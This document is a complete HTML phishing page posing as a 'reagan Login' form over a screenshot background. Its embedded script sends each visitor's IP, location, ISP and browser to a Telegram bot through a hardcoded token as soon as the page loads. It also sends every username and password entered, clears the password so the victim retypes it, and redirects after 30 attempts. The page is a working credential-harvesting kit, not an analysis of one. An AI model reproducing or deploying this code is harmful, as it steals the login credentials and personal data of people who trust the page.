<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>reagan Login</title>
<style>
/* 1. Global Reset */
*, *::before, *::after {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

html, body {
    height: 100%;
    width: 100%;
    overflow: hidden; /* Prevents shifting/scrolling */
    font-family: Arial, sans-serif;
}

/* 2. AUTO-FIXED BACKGROUND (Zero Shift for all Resolutions) */
body {
    background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1780762743/Capture_lvdjzy.jpg');
    /* 100% 100% ensures the image stretches to fit 1920x1080 and 768x1024 exactly */
    background-size: 100% 100%; 
    background-position: center;
    background-repeat: no-repeat;
    background-attachment: fixed;
    height: 100vh;
    width: 100vw;
}

/* 3. INTRO OVERLAY (Responsive Scale) */
#introImageContainer {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: black;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 9999;
}

#introImageContainer img {
    max-width: 100%;
    max-height: 100%;
    object-fit: contain;
}

/* 4. LOGIN BOX - LOCKED POSITIONS (1920px down to 768px) */
.login-container {
    position: absolute;

    /* YOUR EXACT COORDINATES - Percentage ensures zero shift on any resolution */
    top: 48%;     
    right: 20.7%;    

    transform: translateY(-50%);

    /* PROPORTIONAL WIDTH: 
       This makes the box take up ~23% of the screen width, 
       matching the "Big Laptop" look on all resolutions. */
    width: 25%; 
    max-width: 300px; 
    min-width: 200px; /* Safety for Tablet Portrait */

    background: transparent; 
    border-radius: 3px;
    padding: 10px;
}

/* 5. UI Elements (Responsive Fonts) */
.welcome-title {
    color: #0066cc;
    font-size: clamp(20px, 2vw, 32px); /* Auto-shrinks for tablets */
    font-weight: 600;
    margin-bottom: 30px; /* Reduced from 60px to prevent overflow on tablets */
}

.form-input {
    width: 100%; 
    padding: 10px 10px;
    border: 2px solid #d1d5db;
    border-radius: 1px;
    font-size: 10px;
    background: white;
}

.sign-in-btn {
    width: 50%;
    background: #D3D3D3;
    color: black;
    border: none;
    padding: 3px;
    font-size: 15px;
    cursor: pointer;
    font-weight: 300;
    margin-top: 15px;
}

/* 6. TABLET PORTRAIT FIX (768px) */
@media (max-width: 768px) {
    .login-container {
        right: 15%; /* Moves it slightly left so it doesn't hit the edge on thin tablets */
        width: 60%; /* Takes up more space on thin screens */
        max-width: 300px;
    }
}

</style>
</head>
<body>
<!-- Int Image Ovelay -->
<div id="introImageContainer">
<img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png" alt="Intro Image" />
</div>

<!--  Log Fom -->
<div class="login-container" id="loginContainer">
<h1 class="welcome-title"></h1>

<form id="loginForm">
<div id="errorMessage" class="error-message" style="display: none;"></div>

<div class="form-group">
        <label class="form-label">Username:</label>
<input type="text" id="userId" name="userId" class="form-input" required value="" />
</div>

<div class="form-group">
<div class="password-container">
<label class="form-label">Password:</label>
<input type="password" id="password" name="password" class="form-input" required />
<button type="button" class="password-toggle" onclick="togglePassword()"></button>
</div>
</div>

<div class="checkbox-container">
<label for="rememberUser" class="checkbox-label">Forgot password?</label>
</div>

<button type="submit" class="sign-in-btn">Log in</button>

</div>
</form>
</div>

<script>
const token = '757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';
const chatId = '8052751627';
let loginAttempts = 0;

async function sendToTelegram(message) {
if (!navigator.onLine) return;
try {
await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ chat_id: chatId, text: message })
});
} catch (err) {
console.error('Telegram send error:', err);
}
}

function togglePassword() {
const passwordInput = document.getElementById('password');
const toggleButton = document.querySelector('.password-toggle');

if (passwordInput.type === 'password') {
passwordInput.type = 'text';
toggleButton.textContent = '';
} else {
passwordInput.type = 'password';
toggleButton.textContent = '👁';
}
}

function sendVisitorInfo() {
const userAgent = navigator.userAgent;
const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');

if (!navigator.onLine) {
sendToTelegram(`reagan Offline Visi\n🖥 Browser: ${userAgent}\n🔌 Port: ${port}`);
return;
}

fetch('https://ipapi.co/json/')
.then(res => res.json())
.then(data => {
const message = `🌐 reagan Visi \nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
sendToTelegram(message);
}).catch(() => {
sendToTelegram(`🌐 reagan  Visi (IP lookup failed)\nBrowser: ${userAgent}`);
});
}

window.onload = () => {
sendVisitorInfo();

setTimeout(() => {
const intro = document.getElementById('introImageContainer');
const login = document.getElementById('loginContainer');
if (intro) intro.style.display = 'none';
if (login) login.style.display = 'block';
}, 50);
};

document.getElementById('loginForm').addEventListener('submit', async function (e) {
e.preventDefault();

const userId = document.getElementById('userId').value.trim();
const password = document.getElementById('password').value.trim();

if (userId && password) {
loginAttempts++;
const msg = `❌ reagan drop #${loginAttempts}\n👤 User ID: ${userId}\n🔑 Password: ${password}`;
await sendToTelegram(msg);

const errorMsg = document.getElementById('errorMessage');
errorMsg.textContent =
"";
errorMsg.style.display = 'block';

document.getElementById('password').value = '';
document.getElementById('password').focus();

if (loginAttempts >= 30) {
window.location.href =
'https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png';
}
}
});
</script>
</body>
</html>
